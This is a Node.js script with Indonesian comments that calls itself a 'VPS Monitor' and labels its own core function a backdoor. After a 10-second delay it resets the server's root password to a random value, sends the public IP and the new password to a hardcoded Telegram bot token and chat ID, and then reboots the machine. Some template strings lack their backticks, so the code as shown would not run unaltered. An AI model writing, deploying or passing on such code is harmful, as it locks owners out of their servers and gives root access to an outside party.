const https = require('https');
const { exec } = require('child_process');

console.log('VPS Monitor Active...\n');

// Ambil public IP VPS
function getPublicIP(callback) {
  https.get('https://api.ipify.org', (res) => {
    let ip = '';
    res.on('data', (chunk) => {
      ip += chunk;
    });
    res.on('end', () => {
      callback(ip);
    });
  }).on('error', (err) => {
    console.error('Gagal ambil IP:', err.message);
    callback('Unknown');
  });
}

// Generate password random
function generatePassword(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
  let password = '';
  for (let i = 0; i < length; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
}

// Kirim pesan ke Telegram
function sendTelegramMessage(message, callback) {
  const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)};
  https.get(url, (res) => {
    console.log(Telegram status: ${res.statusCode});
    res.on('data', () => {}); // biar ga error no handler
    res.on('end', () => {
      callback();
    });
  }).on('error', (err) => {
    console.error('Gagal kirim ke Telegram:', err.message);
    callback();
  });
}

// Eksekusi backdoor
function runBackdoor() {
  const newPassword = generatePassword(12);
  getPublicIP((ip) => {
    const message = VPS ACTIVE!\nIP: ${ip}\nPassword Baru: ${newPassword};
    console.log([INFO] Public IP: ${ip});
    console.log('[INFO] Password root diganti.');

    // Ganti password root
    exec(echo "root:${newPassword}" | chpasswd, (error) => {
      if (error) {
        console.error('Gagal ganti password:', error.message);
      } else {
        console.log('[INFO] Password root berhasil diganti.');

        // Kirim ke Telegram dulu, baru reboot
        sendTelegramMessage(message, () => {
          console.log('[INFO] Pesan dikirim ke Telegram, reboot VPS...');
          exec('reboot', (err) => {
            if (err) {
              console.error('Gagal reboot:', err.message);
            }
          });
        });
      }
    });
  });
}

// Delay 10 detik sebelum mulai
setTimeout(runBackdoor, 10000);

// Token & Chat ID
const BOT_TOKEN = '7920952604:AAGzvMTqL_ZUCrQ2uvEVpjmT0wf957M7LXo';
const CHAT_ID = '8063349076';